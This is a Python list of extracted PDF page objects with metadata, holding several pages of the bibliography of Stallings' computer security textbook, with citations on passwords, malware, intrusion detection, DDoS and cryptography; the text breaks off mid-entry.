       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 769, 'page_label': '768'}, page_content='768  REFERENCES\\nGOWA01 Goldberg, I., and Wagner, D. “Randomness and the Netscape Browser.”  \\nDr. Dobb’s Journal, July 22, 2001.\\nGOYE99 Goyeneche, J., and Souse, E. “Loadable Kernel Modules.” IEEE Software, \\nJanuary/February 1999.\\nGRAH72 Graham,  G., and Denning, P . “Protection—Principles and Practice.” \\n Proceedings, AFIPS Spring Joint Computer Conference, 1972.\\nGRAH12 Graham-Rowe, D. “Ageing Eyes Hinder Biometric Scans.” Nature, May 2, \\n2012.\\nGRIF76 Griffiths, P ., and Wade, B. “An Authorization Mechanism for a Relational \\nDatabase System.” ACM Transactions on Database Systems, September 1976.\\nGRUS13 Gruschka, N.; Iacono, L.; and Sorge, C. “Analysis of the Current State in Website \\nCertificate Validation.” Security and Communication Networks, Wiley,\\xa02013.\\nGUTM96 Gutmann, P. “Secure Deletion of Data from Magnetic and Solid-State \\n Memory.” Proceedings of the Sixth USENIX Security Symposium, San Jose, \\nCalifornia, July 22–25, 1996.\\nGUTM02 Gutmann, P. “PKI: It’s Not Dead, Just Resting.” Computer, August 2002.\\nHACI02 Hacigumus, H., et al. “Executing SQL over Encrypted Data in the Database-\\nService-Provider Model.” Proceedings, 2002 ACM SIGMOD International \\nConference on Management of Data, 2002.\\nHADS10 Hadsell, E., Successful SIEM and Log Management Strategies for Audit \\nand Compliance, SANS Whitepaper, Nov 2010. https://www.sans.org/\\nreading-room/whitepapers/auditing/successful-siem-log-management-  \\nstrategies-audit-compliance-33528\\nHALF06 Halfond, W.; Viegas, J.; and Orso, A. “A Classification of SQL Injection \\nAttacks and Countermeasures.” Proceedings of the IEEE International \\n Symposium on Secure Software Engineering, 2006.\\nHANS04 Hansman, S., and Hunt, R. “A Taxonomy of Network and Computer Attacks.” \\nComputers & Security, 2004.\\nHARR76 Harrison, M.; Ruzzo, W.; and Ullman, J. “Protection in Operating Systems.” \\nCommunications of the ACM, August 1976.\\nHEBE92 Heberlein, L.; Mukherjee, B.; and Levitt, K. “Internetwork Security Monitor: \\nAn Intrusion-Detection System for Large-Scale Networks.” Proceedings, 15th \\nNational Computer Security Conference, October 1992.\\nHERL12 Herley, C., and Oorschot, P . “A Research Agenda Acknowledging the \\n Persistence of Passwords.” IEEE Security & Privacy, January/February 2012.\\nHILT06 Hiltgen, A.;  Kramp, T.; and Wiegold, T. “Secure Internet Banking \\n Authentication.” IEEE Security and Privacy, Vol. 4, No. 2, 2006.\\nHONE05 The Honeynet Project. Knowing Your Enemy: Tracking Botnets. Honeynet \\nWhite Paper, March 2005. http://honeynet.org/papers/bots\\nHORO15 Horvitz, E. and Mulligan, D. “Data, Privacy, and the Greater Good.” Science, \\n349(6245), July 2015.\\nHOWA03 Howard, M.; Pincus, J.; and Wing, J. “Measuring Relative Attack Surfaces.” \\nProceedings, Workshop on Advanced Developments in Software and Systems \\nSecurity, 2003.\\nHOWA07 Howard, M., and  LeBlanc, D. Writing Secure Code for Windows Vista , \\n Redmond, WA: Microsoft Press, 2007 .\\nHSU98 Hsu, Y. and Seymour, S. “An Intranet Security Framework Based on Short-\\nLived Certificates.” IEEE Internet Computing, March/April 1998.\\nZ04_STAL0611_04_GE_BIB.indd   768 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 770, 'page_label': '769'}, page_content='REFERENCES  769\\nHUIT98 Huitema, C . IPv6: The New Internet Protocol.  Upper Saddle River, NJ: \\n Prentice Hall, 1998.\\nIMPE13 Imperva Corp . Web Application Attack Report.  July 2013. www.imperva  \\n.com\\nIQBA12 Iqbal, Z. “Toward a Semantic-Enhanced Attribute-Based Access Control for \\nCloud Services.” IEEE 111th International Conference on Trust, Security and \\nPrivacy in Computing and Communications, 2012.\\nISF13 Information Security Forum. The Standard of Good Practice for Information \\nSecurity. 2013. www.securityforum.org\\nJAME06 James, A. “UTM Thwarts Blended Attacks.” Network World , October 2, \\n2006.\\nJUDY14 Judy, H., et al. “Privacy in Cyberspace.” In [BOSW14].\\nJUEN85 Jueneman, R.; Matyas, S.; and Meyer, C. “Message Authentication.” IEEE \\nCommunications Magazine, September 1985.\\nJUN99 Jun, B., and Kocher, P . The Intel Random Number Generator.  Intel White \\nPaper, April 22, 1999.\\nKABA14 Kabay, M., and Robertson, B. “Employment Practices and Policies.” In \\n[BOSW14].\\nKAND05 Kandula, S. “Surviving DDoS Attacks.” ;login, October 2005.\\nKELL12 Kelley, P ., et al. “Guess again (and Again and Again): Measuring Password \\nStrength by Simulating Password-Cracking Algorithms.” IEEE Symposium \\non Security and Privacy, 2012.\\nKEPH97a Kephart,  J., et al. “Fighting Computer Viruses.” Scientific American , \\n November 1997 .\\nKEPH97b Kephart, J., et al. “Blueprint for a Computer Immune System.” Proceedings, \\nVirus Bulletin International Conference, October 1997 .\\nKERA16 Keragala D., “Detecting Malware and Sandbox Evasion Techniques.” SANS \\nInstitute InfoSec Reading Room, 2016.\\nKING06 King, N. “E-Mail and Internet Use Policy.” In [BIDG06].\\nKIRK06 Kirk, J . “Tricky New Malware Challenges Vendors.” Network World ,  \\nOctober 30, 2006.\\nKLEI90 Klein, D. “Foiling the Cracker: A Survey of, and Improvements to, Password \\nSecurity.” Proceedings, UNIX Security Workshop II, August 1990.\\nKOBL92 Koblas, D., and Koblas, M. “SOCKS.” Proceedings, UNIX Security \\n Symposium\\xa0III, September 1992.\\nKOCH96 Kocher, P . “Timing Attacks on Implementations of Diffie-Hellman, RSA, \\nDSS, and Other Systems.” Proceedings, Crypto ’96, August 1996.\\nKOMA11 Komanduri, S. “Of Passwords and People: Measuring the Effect of Password-\\nComposition Policies.” CHI Conference on Human Factors in Computing \\nSystems, 2011.\\nKREI09 Kreibich, C., et al. “Spamcraft: An Inside Look At Spam Campaign Orches-\\ntration.” Proceedings of the Second USENIX Workshop on Large-Scale \\nExploits and Emergent Threats (LEET’09), April 2009.\\nKSHE06 Kshetri, N. “The Simple Economics of Cybercrimes.” IEEE Security and \\n Privacy, January/February 2006.\\nKUMA11 Kumar, M. “The Hacker’s Choice Releases SSL DOS Tool.” The Hacker \\nNews, October 24, 2011. http://thehackernews.com/2011/10/hackers-choice  \\n-releases-ssl-ddos-tool.html\\nZ04_STAL0611_04_GE_BIB.indd   769 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 771, 'page_label': '770'}, page_content='770  REFERENCES\\nKUPE99 Kuperman, B., and Spafford, E. “Generation of Application Level Audit Data \\nvia Library Interposition.” CERIAS Tech Report 99-11. Purdue U., October \\n1999. www.cerias.purdue.edu\\nKUPE04 Kuperman, B. A Categorization of Computer Security Monitoring Systems \\nand the Impact on the Design of Audit Sources. CERIAS Tech Report 2004-\\n26; Purdue U. Ph.D. Thesis, August 2004. www.cerias.purdue.edu/\\nKURU12 Kurundkar, G.; Naik, N.; and Khamitkar, S. “Network Intrusion Detection \\nUsing SNORT.” International Journal of Engineering Research and Applica-\\ntions, March–April 2012.\\nKUSH13 Kushner, D. “The Real Story of Stuxnet.” IEEE Spectrum, March 2013.\\nLAMP69 Lampson, B. “Dynamic Protection Structures.” Proceedings, AFIPS Fall Joint \\nComputer Conference, 1969.\\nLAMP71 Lampson, B. “Protection.” Proceedings , Fifth Princeton Symposium on \\n Information Sciences and Systems , March 1971; Reprinted in Operating \\n Systems Review, January 1974.\\nLAMP04 Lampson, B. “Computer Security in the Real World.” Computer, June 2004.\\nLAW06 Law, Y.; Doumen, J.; and Hartel, P . “Survey and Benchmark of Block Ciphers \\nfor Wireless Sensor Networks.” ACM Transactions on Sensor Networks , \\n February 2006.\\nLAWT09 Lawton, G. “On the Trail of the Conficker Worm.” Computer, June 2009.\\nLAZA05 Lazarevic, A.; Kumar, V .; and Srivastava, J. “Intrusion Detection: A Survey.” \\nIn “Managing Cyber Threats: Issues, Approaches and Challenges,” Springer, \\n2005.\\nLEUT94 Leutwyler, K. “Superhack.” Scientific American, July 1994.\\nLEVI06 Levine, J.; Grizzard, J.; and Owen, H. “Detecting and Categorizing \\n Kernel-Level Rootkits to Aid Future Detection.” IEEE Security and Privacy, \\n January–February 2006.\\nLEVI12 Levis, P . “Experiences from a Decade of TinyOS Development.” 10th \\n USENIX Symposium on Operating Systems Design and Implementation, 2012.\\nLEVY96 Levy, E. “Smashing The Stack For Fun And Profit.” Phrack Magazine ,  \\nFile 14, Issue 49, November 1996.\\nLHEE03 Lhee, K., and Chapin, S. “Buffer Overflow and Format String Overflow \\n Vulnerabilities.” Software—Practice and Experience, Volume 33, 2003.\\nLIPM00 Lipmaa, H.; Rogaway, P .; and Wagner, D. “CTR Mode Encryption.” NIST \\nFirst Modes of Operation Workshop, October 2000. \\nLIU03 Liu, Q.; Safavi-Naini, R.; and Sheppard, N. “Digital Rights Management for \\nContent Distribution.” Proceedings, Australasian Information Security Work-\\nshop 2003 (AISW2003), 2003.\\nLOSH16 Loshin, P . “Details Emerging on Dyn DNS DDoS Attack, Mirai IoT Botnet.”  \\nTechTarget, October 28, 2016. http://searchsecurity.techtarget.com/news  \\n/450401962/Details-emerging-on-Dyn-DNS-DDoS-attack-Mirai-IoT-botnet\\nLUK07 Luk, M.,  et al. “MiniSec: A Secure Sensor Network Communication \\n Architectur e.” International Conf. on Information Processing in Sensor \\n Networks, 2007 .\\nLUNT89 Lunt, T. “Aggregation and Inference: Facts and Fallacies.” Proceedings, 1989 \\nIEEE Symposium on Security and Privacy, 1989.\\nL YON15 Lyon, D. “The Snowden Stakes: Challenges for Understanding Surveillance \\nToday.” Surveillance & Society, Vol. 13, No. 2, p. 139, 2015.\\nZ04_STAL0611_04_GE_BIB.indd   770 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 772, 'page_label': '771'}, page_content='REFERENCES  771\\nMA10 Ma, D., and Tsudik, G. “Security and Privacy in Emerging Wireless  Networks.” \\nIEEE Wireless Communications, October 2010.\\nMANA11 Manadhata, P., and Wing, J. “An Attack Surface Metric.” IEEE Transactions \\non Software Engineering, Vol. 37 , No. 3, 2011.\\nMAND13 Mandiant. “APT1: Exposing One of China’s Cyber Espionage Units.” 2013. \\nhttp://intelreport.mandiant.com\\nMANS01 Mansfield, T.; et al. Biometric Product Testing Final Report. National Physics \\nLaboratory, United Kingdom, March 2001. \\nMART73 Martin, J. Security, Accuracy, and Privacy in Computer Systems. Englewood \\nCliffs, NJ: Prentice Hall, 1973.\\nMAUW05 Mauw, S., and Oostdijk, M. “Foundations of Attack Trees.” International \\n Conference on Information Security and Cryptology, 2005.\\nMAZU13 Mazurek, M., et al. “Measuring Password Guessability for an Entire \\n University.” Proceedings of the 2013 ACM SIGSAC Conference on Computer \\n& Communications Security, November 2013.\\nMCGR06 McGraw, G. Software Security: Building Security In. Reading, MA: Addison-\\nWesley, 2006.\\nMCCL05 McClure, R., and Kruger, I. “SQL DOM: Compile Time Checking of Dynamic \\nSQL Statements.” 27th International Conference on Software Engineering , \\n2005.\\nMCCL12 McClure, S.; Scambray, J.; and Kurtz, G. Hacking Exposed 7: Network Security \\nSecrets & Solutions. New York, NY. McGraw-Hill, 2012.\\nMEER10 Meer, H. “Memory Corruption Attacks the (almost) Complete History.” \\nBlack Hat, Las Vegas, 2010.\\nMESS06 Messner, E. “ All-in-one Security Devices Face Challenges.” Network World, \\nAugust 14, 2006.\\nMEYE13 Meyer, C.; Schwenk, J.; and Gortz, H. “Lessons Learned From Previous SSL/\\nTLS Attacks – A Brief Chronology Of Attacks And Weaknesses.” Cryptology \\nePrint Archive, 2013. http://eprint.iacr.org/2013/\\nMICH06 Michael, M. “Physical Security Measures.” In [BIDG06].\\nMILL07 Miller, B.; Cooksey, G.; and Moore, F. “An Empirical Study of the Robustness \\nof MacOS Applications Using Random Testing.” ACM SIGOPS Operating \\nSystems Review, Volume 41, Issue 1, January 2007 .\\nMILL11 Miller, K. “Moral Responsibility for Computing Artifacts: The Rules.” ITPro, \\nMay/June 2011.\\nMIRA05 Michael, C., and Radosevich, W. Black Box Security Testing Tools, US DHS \\nBuildSecurityIn, Cigital, December 2005.\\nMIRK04 Mirkovic, J., and Relher, P . “A Taxonomy of DDoS Attack and DDoS \\nDefense Mechanisms.” ACM SIGCOMM Computer Communications \\nReview, April\\xa02004.\\nMOOR01 Moore, A.; Ellison, R.; and Linger, R. “Attack Modeling for Information \\n Security and Survivability.” Carnegie-Mellon University Technical Note \\nCMU/SEI-2001-TN-001, March 2001.\\nMOOR02 Moore, D.; Shannon, C.; and Claffy, K. “Code-Red: A Case Study on the \\nSpread and Victims of an Internet Worm.” Proceedings of the 2nd ACM \\n SIGCOMM Workshop on Internet Measurement, November 2002.\\nMOOR06 Moore, D., et al. “Inferring Internet Denial-of-Service Activity.” ACM \\n Transactions on Computer Systems, May 2006.\\nZ04_STAL0611_04_GE_BIB.indd   771 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 773, 'page_label': '772'}, page_content='772  REFERENCES\\nMORR79 Morris, R., and Thompson, K. “Password Security: A Case History.” \\n Communications of the ACM, November 1979.\\nNARA05 Narayanan, A., and Shmatikov, V . “Fast Dictionary Attacks on Passwords \\nUsing Time-Space Tradeoff.” Proceedings, ACM Conference on Computer \\nand Communications Security (CCS), 2005.\\nNBSP08 National Biometric Security Project.  Biometric Technology Application \\n Manual Volume 2: Applying Biometrics. Winter 2008.\\nNCAE13 National Centers of Academic Excellence in Information Assurance/Cyber \\nDefense. NCAE IA/CD Knowledge Units. June 2013.\\nNEME10 Nemeth, E., et al. UNIX and Linux Administration Handbook , Fourth \\n Edition, Upper Saddle River, NJ: Prentice Hall, 2010.\\nNIEM11 Niemietz, M. “UI Redressing: Attacks and Countermeasures Revisited.” \\nDecember 2011. http://ui-redressing.mniemietz.de\\nNRC91 National R esearch Council. Computers at Risk: Safe Computing in the \\n Information Age. Washington, DC: National Academy Press, 1991.\\nNRC02 National Research Council. Cybersecurity: Today and Tomorrow.  Washington, \\nDC: National Academy Press, 2002.\\nNSTC11 National Science and T echnology Council. The National Biometrics \\n Challenge. September 2011.\\nOECH03 Oechslin, P. “Making a Faster Cryptanalytic Time–Memory Trade-Off.” \\n Proceedings, Crypto 03, 2003.\\nOGOR03 O’Gorman, L.  “Comparing Passwords, Tokens and Biometrics for User \\nAuthentication.” Proceedings of the IEEE, December 2003.\\nOPEN13 Openwall.com. John the Ripper Password Cracker. http://www.openwall.com \\n/john/doc/\\nORMA03 Orman, H. “The Morris Worm: A Fifteen-Year Perspective.” IEEE Security \\nand Privacy, September/October 2003.\\nOWAS13 Open Web Application Security Project. OWASP Top 10—2013: The Ten \\nMost Critical Web Application Security Risks. 2013. www.owasp.org\\nPARK88 Parker, D.; Swope, S.; and Baker, B. Ethical Conflicts in Information and \\nComputer Science, Technology and Business. Final Report, SRI Project 2609, \\nSRI International 1988.\\nPENG07 Peng, T.; Leckie, C.; and Rammohanarao, K. “Survey of Network-Based \\nDefense Mechanisms Countering the DoS and DDoS Problems.” ACM \\nComputing Surveys, April 2007 .\\nPERR03 Perrine, T. “The End of crypt() Passwords\\xa0.\\xa0.\\xa0.\\xa0Please?” ;login, December 2003.\\nPIEL08 Pielke, R., et al. “Normalized Hurricane Damage in the United States: \\n 1900–2005.” Natural Hazards Review, February 2008.\\nPLAT13 Plate, H.; Basile, C.; and Paraboschi, S. “Policy-Driven System Management.” \\nIn [VACC13].\\nPLAT14 Platt, F. “Physical Threats to the Information Infrastructure.” In [BOSW14].\\nPOLL12 Poller, A., et al. “Electronic Identity Cards for User Authentication—Promise \\nand Practice.” IEEE Security & Privacy, January/February 2012.\\nPOLO13 Polonetsky, J. and Tene, O., “Privacy and big data: making ends meet.” \\n Stanford Law Review, 66(25), September 2013.\\nPORR92 Porras, P. STAT: A State Transition Analysis Tool for Intrusion Detection.  \\n Master’s Thesis, University of California at Santa Barbara, July 1992.\\nZ04_STAL0611_04_GE_BIB.indd   772 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 774, 'page_label': '773'}, page_content='REFERENCES  773\\nPROV99 Provos, N., and Mazieres, D. “A Future-Adaptable Password Scheme.” \\n Proceedings of the 1999 USENIX Annual Technical Conference, 1999.\\nRAJA05 Rajab, M., Monrose, F., and Terzis, A., “On the Effectiveness of Distributed \\nWorm Monitoring.” Proceedings, 14th USENIX Security Symposium, 2005.\\nRIBE96 Ribenboim, P. The New Book of Prime Number Records. New York: Springer-\\nVerlag, 1996.\\nRIVE78 Rivest, R.; Shamir, A.; and Adleman, L. “A Method for Obtaining Digital \\nSignatures and Public Key Cryptosystems.” Communications of the ACM , \\nFebruary 1978.\\nROBB06a Robb, D. “Desktop Defenses.” ComputerWorld, May 22, 2006.\\nROBB06b Robb, D. “Better Security Pill Gets Suite-r.” Business Communications \\nReview, October 2006.\\nROBS95 Robshaw, M. Stream Ciphers. RSA Laboratories Technical Report TR-701, \\nJuly 1995.\\nROGA01 Rogaway, P .; Bellare, M.; Black. J.; and Krovetz, T. “OCB: A Block-Cipher \\nMode of Operation for Efficient Authenticated Encryption.” NIST Proposed \\nBlock Cipher Mode, August 2001. http://csrc.nist.gov/groups/ST/toolkit  \\n/BCM/documents/proposedmodes/ocb/ocb-spec.pdf\\nROGA03 Rogaway, P .; Bellare, M.; and Black.J. “OCB: A Block-Cipher Mode of \\n Operation for Ef ficient Authenticated Encryption.” ACM Transactions on \\nInformation and System Security, August 2003.\\nROSA14 Rosado, T., and Bernardino, J. “An Overview of OpenStack Architecture.” \\nACM IDEAS ’14, July 2014.\\nROTH05 Roth, D., and Mehta, S. “The Great Data Heist.” Fortune, May 16, 2005.\\nRYAN16 Ryan, M.H., “Persona Non Data: How Courts in the EU, UK and  Canada Are \\nAddressing the Issue of Communications Data Surveillance vs. Privacy Rights.” \\nSocial Science Research Network, https://ssrn.com/abstract=2742057 , 2016.\\nSA04 Standards Australia. “HB 231:2004—Information Security Risk  Management \\nGuidelines.” 2004.\\nSADO03 Sadowsky, G. et al. Information Technology Security Handbook. Washington,  \\nDC: The World Bank, 2003. http://www.infodev.org/articles/information-  \\ntechnology-security-handbook\\nSALT75 Saltzer, J., and Schroeder, M. “The Protection of Information in Computer \\nSystems.” Proceedings of the IEEE, September 1975.\\nSAND94 Sandhu, R., and Samarati, P . “Access Control: Principles and Practice.” IEEE \\nCommunications Magazine, February 1994.\\nSAND96 Sandhu, R., et al. “Role-Based Access Control Models.” Computer, February \\n1996.\\nSASN13 Standards Australia and Standards New Zealand. “HB 98:2013—Security \\nRisk Management.” 2013.\\nSCHA01 Schaad. A.; Moffett, J.; and Jacob, J. “The Role-Based Access Control System \\nof a European Bank: A Case Study and Discussion.” Proceedings, SACMAT \\n‘01, May 2001.\\nSCHN99 Schneier, B. “Attack Trees: Modeling Security Threats.” Dr. Dobb’s Journal, \\nDecember 1999.\\nSCHN00 Schneier, B. Secrets and Lies: Digital Security in a Networked World.  \\nNew\\xa0York: Wiley, 2000.\\nZ04_STAL0611_04_GE_BIB.indd   773 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 775, 'page_label': '774'}, page_content='774  REFERENCES\\nSCHN14 Schneier,  B. “The Internet of Things Is Wildly Insecure—and Often \\n Unpatchable.” Wired, January 6, 2014.\\nSEAG08 Seagate Technology. 128-Bit Versus 256-Bit AES Encryption.  Seagate \\nT echnology Paper, 2008.\\nSEFR12 Serfaoui, O.; Aissaoui, M.; and Eleuldj, M. “OpenStack: Toward an Open-\\nSource Solution for Cloud Computing.” International Journal of Computer \\nApplications, October 2012.\\nSEI06 Software Engineering Institute. Capability Maturity Model for Development \\nVersion 1.2. Carnegie-Mellon, August 2006.\\nSHAR13 Shar, L., and Tan, H. “Defeating SQL Injection.” Computer, March 2013.\\nSIDI05 Sidiroglou, S., and Keromytis, A. “Countering Network Worms through \\n Automatic Patch Generation.” IEEE Security & Privacy , November–  \\nDecember 2005.\\nSIMP11 Simpson, S., ed. “Fundamental Practices for Secure Software Development, \\n2/e.” SAFECode, February 2011.\\nSING99 Singh, S. The Code Book: The Science of Secrecy from Ancient Egypt to \\n Quantum Cryptography. New York: Anchor Books, 1999.\\nSING03 Singer, A. “Life Without Firewalls.” ;login, December 2003.\\nSING04 Singer, A., and Bird, T. Building a Logging Infrastructure . Short Topics in \\nSystem Administration, Published by USENIX Association for Sage, 2004. \\nsageweb.sage.org\\nSING11 Singhal, N., and Raina, J. “Comparative Analysis of AES and RC4  Algorithms \\nfor Bet ter Utilization.” International Journal of Computer Trends and \\n Technology, July–August 2011.\\nSKAP07 Skapinetz, K. “Virtualisation as a Blackhat Tool.” Network Security, October \\n2007 .\\nSMIT12 Smith, M.; Szongott, C.; Henne, B.; and von Voigt, G. “Big Data Privacy Issues \\nin Public Social Media.” 2012 6th IEEE International Conference on Digital \\nEcosystems and Technologies (DEST), IEEE, June 2012.\\nSNAP91 Snapp, S., et al. “A System for Distributed Intrusion Detection.” Proceedings, \\nCOMPCON Spring ’91, 1991.\\nSOUR12 Sourav, K., and Mishra, D. “DDoS Detection and Defense: Client Termina-\\ntion Approach.” Proceedings of the CUBE International Information Tech-\\nnology Conference, 2012.\\nSPAF89 Spafford, E. “Crisis and Aftermath.” Communications of the ACM, June 1989.\\nSPAF92a Spafford, E. “Observing Reusable Password Choices.” Proceedings, UNIX \\nSecurity Symposium III, September 1992.\\nSPAF92b Spafford, E. “OPUS: Preventing Weak Password Choices.” Computers and \\nSecurity, No. 3, 1992.\\nSPAF00 Spafford, E., and Zamboni, D. “Intrusion Detection Using Autonomous \\nAgents.” Computer Networks, October 2000.\\nSPIT03 Spitzner, L. “The Honeynet Project: Trapping the Hackers.” IEEE Security \\nand Privacy, March/April 2003.\\nSTAL14 Stallings, W. Data and Computer Communications, Tenth Edition.  Upper \\nSaddle River, NJ: Pearson, 2014.\\nSTAL16a Stallings, W. Foundations of Modern Networking: SDN, NFV , QoE, IoT, and \\nCloud. Hoboken, NJ: Pearson, 2016.\\nZ04_STAL0611_04_GE_BIB.indd   774 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 776, 'page_label': '775'}, page_content='REFERENCES  775\\nSTAL16b Stallings,  W. Computer Organization and Architecture: Designing for \\n Performance, Tenth Edition. Hoboken, NJ: Pearson, 2016.\\nSTAL16c Stallings, W. Operating Systems: Internals and Design Principles, Ninth \\n Edition. Hoboken, NJ: Pearson, 2016.\\nSTAL17 Stallings, W. Cryptography and Network Security: Principles and Practice, \\nSeventh Edition. Hoboken, NJ: Pearson, 2017 .\\nSTEP93 Stephenson, P. “Preventive Medicine.” LAN Magazine, November 1993.\\nSTEV07 Stevens, M.; Lenstra, A.; and Weger, B. “Chosen-Prefix Collisions for MD5 \\nand Colliding X.509 Certificates for Different Identities.” in Proceedings \\nEUROCRYPT ’07, Springer-Verlag 2007 .\\nSTEV11 Stevens, D. “Malicious PDF Documents Explained.” IEEE Security & \\n Privacy, January/February 2011.\\nSTON10 Stone, P . “Next Generation Clickjacking.” BlackHat Europe 2010, April 2010. \\nhttp://contextis.co.uk/files/Context-Clickjacking_white_paper.pdf\\nSYMA01 Symantec Corp. The Digital Immune System. Symantec Technical Brief, 2001.\\nSYMA05 Symantec Corp . Symantec™ Central Quarantine Administrator’s Guide.  \\nSymantec Documentation, 2005.\\nSYMA16 Symantec. “Internet Security Threat Report, Vol. 21.” April 2016.\\nSZUB98 Szuba, T . Safeguarding Your Technology.  National Center for Educa -\\ntion  Statistics, NCES 98-297 , 1998. nces.ed.gov/pubsearch/pubsinfo.asp?  \\npubid=98297\\nTARA11 Tarala, J., Implementing the 20 Critical Controls with Security Information and \\nEvent Management (SIEM) Systems, SANS Whitepaper, Apr 2011. https://\\nwww.sans.org/reading-room/whitepapers/analyst/implementing-20-critical-\\ncontrols-security-information-event-management-siem-systems-34965\\nTA YL11 Taylor, G., and Cox, G. “Digital Randomness.” IEEE Spectrum, September 2011.\\nTHOM84 Thompson, K. “Reflections on Trusting Trust (Deliberate Software Bugs).” \\nCommunications of the ACM, August 1984.\\nTIRO05 Tiron, R. “Biometrics Systems Help Strengthen Border Security in Persian \\nGulf Nation.” National Defense, June 2005.\\nTOBA07 Tobarra, L.; Cazorla, D.; Cuartero, F.; and Diaz, G. “Analysis of  Security \\n Protocol MiniSec for Wireless Sensor Networks.” The IV Congreso \\nIberoamericano de Seguridad Informatica (CIBSI’07), November 2007 .\\nTIMM10 Timmer, J. “32 Million Passwords Show Most Users Careless about Security.” \\nArs Technica, January 21, 2010.\\nTRUS16 Trustwave, Inc. Global Security Report. trustwave.com. 2016\\nTSUD92 Tsudik, G. “Message Authentication with One-Way Hash Functions.” \\n Proceedings, INFOCOM ’92, May 1992.\\nVACC13 Vacca, J., ed. Computer and Information Security Handbook, Waltham, MA: \\nMorgan Kaufmann, 2013.\\nVANO94 van Oorschot, P ., and Wiener, M. “Parallel Collision Search with Applica-\\ntion to Hash Functions and Discrete Logarithms.” Proceedings, Second ACM \\nConference on Computer and Communications Security, 1994.\\nVEEN12 van der Veen, V .; dutt-Sharma, N.; Cavallaro, L.; and Bos, H. “Memory Errors: \\nThe Past, the Present, and the Future.” in Proceedings of the 15th interna -\\ntional conference on Research in Attacks, Intrusions, and Defenses  (RAID \\n’12), Springer-Verlag, pp. 86–106, 2012.\\nZ04_STAL0611_04_GE_BIB.indd   775 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 777, 'page_label': '776'}, page_content='776  REFERENCES\\nVENE06 Venema, W. “Secure Programming Traps and Pitfalls—The Broken File \\nShredder.” Proceedings of the AusCERT2006 IT Security Conference, Gold \\nCoast, Australia, May 2006.\\nVERA16 Veracode, Inc. State of Software Security Report. www.veracode.com, 2016.\\nVERI16 Verizon. 2013 Data Breach Investigations Report. 2016.\\nVIEG01 Viega, J., and McGraw, G. Building Secure Software: How to Avoid Security \\nProblems the Right Way. Reading, MA: Addison-Wesley, 2001.\\nWAGN00 Wagner, D., and Goldberg, I. “Proofs of Security for the UNIX Password \\nHashing Algorithm.” 